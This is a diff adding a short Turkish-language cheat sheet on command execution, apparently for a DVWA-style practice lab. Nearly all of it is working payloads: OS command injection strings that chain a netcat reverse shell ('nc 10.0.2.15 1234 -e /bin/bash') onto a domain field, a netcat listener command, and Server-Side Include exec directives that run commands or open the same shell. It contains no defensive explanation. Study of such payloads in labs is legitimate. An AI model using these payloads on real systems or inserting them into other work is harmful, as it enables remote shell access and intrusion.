@@ -1,0 +1,21 @@
+KOD CALISTIRMA & SSI
+
+OS Command Enjeksiyon:
+Terminal--> nc -nvlp 1234
+ Ardindan,
+www.google.com;nc 10.0.2.15 1234 -e /bin/bash 	 (low level)
+www.google.com&&nc 10.0.2.15 1234 -e /bin/bash 	 (low level)
+www.google.com | nc 10.0.2.15 1234 -e /bin/bash  (medium level)
+
+
+
+Server-Side Includes (SSI):
+<!--#exec cmd="ls"-->
+<!--#exec cmd="nc 10.0.2.15 1234 -e /bin/bash"-->
+
+
+SSI (medium)
+<!--#exec cmd=ls -l-->
+
+nc -nvlp 1234
+<!--#exec cmd=nc 10.0.2.15 1234 -e /bin/bash-->
